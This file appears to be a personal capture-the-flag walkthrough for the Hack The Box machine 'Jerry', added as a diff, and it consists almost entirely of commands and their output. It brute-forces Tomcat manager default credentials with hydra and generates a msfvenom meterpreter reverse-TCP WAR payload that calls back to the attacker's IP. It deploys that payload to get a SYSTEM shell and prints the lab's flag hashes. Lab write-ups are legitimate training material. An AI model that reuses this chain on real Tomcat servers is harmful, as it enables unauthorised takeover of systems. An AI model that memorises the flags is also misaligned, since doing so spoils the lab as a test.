@@ -1,0 +1,475 @@
+Machine-Name  :  Jerry
+IP-Address    :  10.129.1.110
+
+Command-Line: sudo nmap -A 10.129.1.110
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-06 22:35 EST
+    Nmap scan report for 10.129.1.110
+    Host is up (0.053s latency).
+    Not shown: 999 filtered ports
+    PORT     STATE SERVICE VERSION
+    8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+    |_http-favicon: Apache Tomcat
+    |_http-open-proxy: Proxy might be redirecting requests
+    |_http-server-header: Apache-Coyote/1.1
+    |_http-title: Apache Tomcat/7.0.88
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Device type: general purpose
+    Running (JUST GUESSING): Microsoft Windows 2012|7|2008|2016|Vista (91%)
+    OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+    Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 7 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+
+    TRACEROUTE (using port 8080/tcp)
+    HOP RTT      ADDRESS
+    1   54.03 ms 10.10.14.1
+    2   54.06 ms 10.129.1.110
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 20.74 seconds
+
+
+Broswer: 10.129.1.110:8080
+Result:
+Apache Tomcat Server
+
+Command-Line:
+    HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.129.1.110:8080/manager/html
+Alternative-Command-Line-Option:
+    HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.129.1.110 http-get /manager/html
+Result:
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-07 00:51:49
+    [INFO] Using HTTP Proxy: http://127.0.0.1:8080
+    [DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task
+    [DATA] attacking http-get://10.129.1.110:8080/manager/html
+    [8080][http-get] host: 10.129.1.110   login: admin   password: admin
+    [8080][http-get] host: 10.129.1.110   login: admin   password: admin
+    [8080][http-get] host: 10.129.1.110   login: tomcat   password: s3cret
+    [8080][http-get] host: 10.129.1.110   login: tomcat   password: s3cret
+    1 of 1 target successfully completed, 4 valid passwords found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-07 00:51:51
+
+Burpsuite: Indicated that only "[8080][http-get] host: 10.129.1.110   login: tomcat   password: s3cret" returned 200 OK.
+
+Found: <user username="tomcat" password="s3cret" roles="manager-gui"/>
+
+Notes: Cleared browser history regularly to clear cache.
+
+*** LOGGED INTO SERVER USING CREDENTIALS ***
+
+Processor: amd64
+
+Notes: Java files are allowed to be uploaded in the server.
+
+Searching for exploits...
+
+Command-Line: msfvenom -l payloads
+Found: windows/x64/meterpreter/reverse_tcp
+Command-Line: msfvenom -l formats
+Found: war
+
+Command-Line: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.147 LPORT=9001 -f war -o ~/Desktop/HTB/Machines/Jerry_NF/msfvenom-output.war
+Result:
+    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+    [-] No arch selected, selecting arch: x64 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 510 bytes
+    Final size of war file: 2455 bytes
+    Saved as: /home/kali/Desktop/HTB/Machines/Jerry_NF/msfvenom-output.war
+
+Notes: .war file created.
+
+Command-Line: msfdb run
+Result:
+    msf >
+
+msf > search exploit
+Result: "Many results..."
+
+msf > search multi/handler
+Result:
+    Matching Modules
+    ================
+
+       #  Name                                                 Disclosure Date  Rank       Check  Description
+       -  ----                                                 ---------------  ----       -----  -----------
+       0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+       1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+       2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
+       3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+       4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
+       5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
+       6  exploit/multi/handler                                                 manual     No     Generic Payload Handler
+       7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+       8  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
+
+
+msf > use 6
+Result:
+    msf6 exploit(multi/handler) >
+
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+Result:
+    payload => windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set lhost tun0
+Result:
+    lhost => 10.10.14.147
+
+msf6 exploit(multi/handler) > set lport 9001
+Result:
+    lport => 9001
+
+Notes: Ran "set lhost tun0" command twice. Sometimes it doesn't set up the first time. The same was done with "lport".
+
+msf6 exploit(multi/handler) > exploit -j
+Result:
+    [*] Exploit running as background job 0.
+    [*] Exploit completed, but no session was created.
+
+    [*] Started reverse TCP handler on 10.10.14.147:9001
+    msf6 exploit(multi/handler) >
+
+Notes: Deployed .war file to server. Clicked on filename.
+Result:
+    404 Error.
+
+Command-Line: mkdir tmp
+Command-Line: cd tmp
+Command-Line: cp ../msfvenom-output.war .
+Command-Line: unzip msfvenom-output.war
+Result:
+    Archive:  msfvenom-output.war
+    creating: META-INF/
+    inflating: META-INF/MANIFEST.MF
+    creating: WEB-INF/
+    inflating: WEB-INF/web.xml
+    inflating: rhfdszue.jsp
+
+Notes: Appened rhfdszue.jsp to end of URL in Browser.
+
+Browser: http://10.129.1.110:8080/msfvenom-output/rhfdszue.jsp
+Result:
+    msf6 exploit(multi/handler) > [*] Sending stage (200262 bytes) to 10.129.1.110
+    [*] Meterpreter session 1 opened (10.10.14.147:9001 -> 10.129.1.110:49192) at 2020-12-07 01:32:53 -0500
+
+msf6 exploit(multi/handler) > sessions -i 1
+Result:
+    [*] Starting interaction with 1...
+
+    meterpreter >
+
+meterpreter > help
+Result:
+    Core Commands
+    =============
+
+        Command                   Description
+        -------                   -----------
+        ?                         Help menu
+        background                Backgrounds the current session
+        bg                        Alias for background
+        bgkill                    Kills a background meterpreter script
+        bglist                    Lists running background scripts
+        bgrun                     Executes a meterpreter script as a background thread
+        channel                   Displays information or control active channels
+        close                     Closes a channel
+        disable_unicode_encoding  Disables encoding of unicode strings
+        enable_unicode_encoding   Enables encoding of unicode strings
+        exit                      Terminate the meterpreter session
+        get_timeouts              Get the current session timeout values
+        guid                      Get the session GUID
+        help                      Help menu
+        info                      Displays information about a Post module
+        irb                       Open an interactive Ruby shell on the current session
+        load                      Load one or more meterpreter extensions
+        machine_id                Get the MSF ID of the machine attached to the session
+        migrate                   Migrate the server to another process
+        pivot                     Manage pivot listeners
+        pry                       Open the Pry debugger on the current session
+        quit                      Terminate the meterpreter session
+        read                      Reads data from a channel
+        resource                  Run the commands stored in a file
+        run                       Executes a meterpreter script or Post module
+        secure                    (Re)Negotiate TLV packet encryption on the session
+        sessions                  Quickly switch to another session
+        set_timeouts              Set the current session timeout values
+        sleep                     Force Meterpreter to go quiet, then re-establish session.
+        transport                 Change the current transport mechanism
+        use                       Deprecated alias for "load"
+        uuid                      Get the UUID for the current session
+        write                     Writes data to a channel
+
+
+    Stdapi: File system Commands
+    ============================
+
+        Command       Description
+        -------       -----------
+        cat           Read the contents of a file to the screen
+        cd            Change directory
+        checksum      Retrieve the checksum of a file
+        cp            Copy source to destination
+        del           Delete the specified file
+        dir           List files (alias for ls)
+        download      Download a file or directory
+        edit          Edit a file
+        getlwd        Print local working directory
+        getwd         Print working directory
+        lcd           Change local working directory
+        lls           List local files
+        lpwd          Print local working directory
+        ls            List files
+        mkdir         Make directory
+        mv            Move source to destination
+        pwd           Print working directory
+        rm            Delete the specified file
+        rmdir         Remove directory
+        search        Search for files
+        show_mount    List all mount points/logical drives
+        upload        Upload a file or directory
+
+
+    Stdapi: Networking Commands
+    ===========================
+
+        Command       Description
+        -------       -----------
+        arp           Display the host ARP cache
+        getproxy      Display the current proxy configuration
+        ifconfig      Display interfaces
+        ipconfig      Display interfaces
+        netstat       Display the network connections
+        portfwd       Forward a local port to a remote service
+        resolve       Resolve a set of host names on the target
+        route         View and modify the routing table
+
+
+    Stdapi: System Commands
+    =======================
+
+        Command       Description
+        -------       -----------
+        clearev       Clear the event log
+        drop_token    Relinquishes any active impersonation token.
+        execute       Execute a command
+        getenv        Get one or more environment variable values
+        getpid        Get the current process identifier
+        getprivs      Attempt to enable all privileges available to the current process
+        getsid        Get the SID of the user that the server is running as
+        getuid        Get the user that the server is running as
+        kill          Terminate a process
+        localtime     Displays the target system local date and time
+        pgrep         Filter processes by name
+        pkill         Terminate processes by name
+        ps            List running processes
+        reboot        Reboots the remote computer
+        reg           Modify and interact with the remote registry
+        rev2self      Calls RevertToSelf() on the remote machine
+        shell         Drop into a system command shell
+        shutdown      Shuts down the remote computer
+        steal_token   Attempts to steal an impersonation token from the target process
+        suspend       Suspends or resumes a list of processes
+        sysinfo       Gets information about the remote system, such as OS
+
+
+    Stdapi: User interface Commands
+    ===============================
+
+        Command        Description
+        -------        -----------
+        enumdesktops   List all accessible desktops and window stations
+        getdesktop     Get the current meterpreter desktop
+        idletime       Returns the number of seconds the remote user has been idle
+        keyboard_send  Send keystrokes
+        keyevent       Send key events
+        keyscan_dump   Dump the keystroke buffer
+        keyscan_start  Start capturing keystrokes
+        keyscan_stop   Stop capturing keystrokes
+        mouse          Send mouse events
+        screenshare    Watch the remote user desktop in real time
+        screenshot     Grab a screenshot of the interactive desktop
+        setdesktop     Change the meterpreters current desktop
+        uictl          Control some of the user interface components
+
+
+    Stdapi: Webcam Commands
+    =======================
+
+        Command        Description
+        -------        -----------
+        record_mic     Record audio from the default microphone for X seconds
+        webcam_chat    Start a video chat
+        webcam_list    List webcams
+        webcam_snap    Take a snapshot from the specified webcam
+        webcam_stream  Play a video stream from the specified webcam
+
+
+    Stdapi: Audio Output Commands
+    =============================
+
+        Command       Description
+        -------       -----------
+        play          play a waveform audio file (.wav) on the target system
+
+
+    Priv: Elevate Commands
+    ======================
+
+        Command       Description
+        -------       -----------
+        getsystem     Attempt to elevate your privilege to that of local system.
+
+
+    Priv: Password database Commands
+    ================================
+
+        Command       Description
+        -------       -----------
+        hashdump      Dumps the contents of the SAM database
+
+
+    Priv: Timestomp Commands
+    ========================
+
+        Command       Description
+        -------       -----------
+        timestomp     Manipulate file MACE attributes
+
+
+
+meterpreter > getuid
+Result:
+    Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Result:
+    Process 672 created.
+    Channel 1 created.
+    Microsoft Windows [Version 6.3.9600]
+    (c) 2013 Microsoft Corporation. All rights reserved.
+
+    C:\apache-tomcat-7.0.88>
+
+C:\apache-tomcat-7.0.88> dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is FC2B-E489
+
+     Directory of C:\apache-tomcat-7.0.88
+
+    06/19/2018  03:07 AM    <DIR>          .
+    06/19/2018  03:07 AM    <DIR>          ..
+    06/19/2018  03:06 AM    <DIR>          bin
+    06/19/2018  05:47 AM    <DIR>          conf
+    06/19/2018  03:06 AM    <DIR>          lib
+    05/07/2018  01:16 PM            57,896 LICENSE
+    12/07/2020  12:37 PM    <DIR>          logs
+    05/07/2018  01:16 PM             1,275 NOTICE
+    05/07/2018  01:16 PM             9,600 RELEASE-NOTES
+    05/07/2018  01:16 PM            17,454 RUNNING.txt
+    12/07/2020  03:36 PM    <DIR>          temp
+    12/07/2020  03:33 PM    <DIR>          webapps
+    06/19/2018  03:34 AM    <DIR>          work
+                   4 File(s)         86,225 bytes
+                   9 Dir(s)  27,600,703,488 bytes free
+
+
+C:\apache-tomcat-7.0.88> cd \users
+Result:
+    C:\Users>
+
+C:\Users> dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is FC2B-E489
+
+     Directory of C:\Users
+
+    06/18/2018  10:31 PM    <DIR>          .
+    06/18/2018  10:31 PM    <DIR>          ..
+    06/18/2018  10:31 PM    <DIR>          Administrator
+    08/22/2013  05:39 PM    <DIR>          Public
+                   0 File(s)              0 bytes
+                   4 Dir(s)  27,600,703,488 bytes free
+
+
+
+C:\Users> cd administrator
+Result:
+    C:\Users\Administrator>
+
+
+C:\Users\Administrator> dir
+Result:
+    06/18/2018  10:31 PM    <DIR>          .
+    06/18/2018  10:31 PM    <DIR>          ..
+    06/19/2018  05:43 AM    <DIR>          Contacts
+    06/19/2018  06:09 AM    <DIR>          Desktop
+    06/19/2018  05:43 AM    <DIR>          Documents
+    06/19/2018  05:43 AM    <DIR>          Downloads
+    06/19/2018  05:43 AM    <DIR>          Favorites
+    06/19/2018  05:43 AM    <DIR>          Links
+    06/19/2018  05:43 AM    <DIR>          Music
+    06/19/2018  05:43 AM    <DIR>          Pictures
+    06/19/2018  05:43 AM    <DIR>          Saved Games
+    06/19/2018  05:43 AM    <DIR>          Searches
+    06/19/2018  05:43 AM    <DIR>          Videos
+                   0 File(s)              0 bytes
+                  13 Dir(s)  27,600,703,488 bytes free
+
+
+C:\Users\Administrator> cd Desktop
+Result:
+    C:\Users\Administrator\Desktop>
+
+
+C:\Users\Administrator\Desktop> dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is FC2B-E489
+
+     Directory of C:\Users\Administrator\Desktop
+
+    06/19/2018  06:09 AM    <DIR>          .
+    06/19/2018  06:09 AM    <DIR>          ..
+    06/19/2018  06:09 AM    <DIR>          flags
+                   0 File(s)              0 bytes
+                   3 Dir(s)  27,600,904,192 bytes free
+
+
+C:\Users\Administrator\Desktop> cd flags
+Result:
+    C:\Users\Administrator\Desktop\flags>
+
+
+C:\Users\Administrator\Desktop\flags> dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is FC2B-E489
+
+     Directory of C:\Users\Administrator\Desktop\flags
+
+    06/19/2018  06:09 AM    <DIR>          .
+    06/19/2018  06:09 AM    <DIR>          ..
+    06/19/2018  06:11 AM                88 2 for the price of 1.txt
+                   1 File(s)             88 bytes
+                   2 Dir(s)  27,600,904,192 bytes free
+
+
+C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
+Result:
+    type "2 for the price of 1.txt"
+    user.txt
+    7004dbcef0f854e0fb401875f26ebd00
+
+    root.txt
+    04a8b36e1545a455393d067e772fe90e
+
+    *** USER AND ROOT OWNED ***
+
+*** FINISHED ***
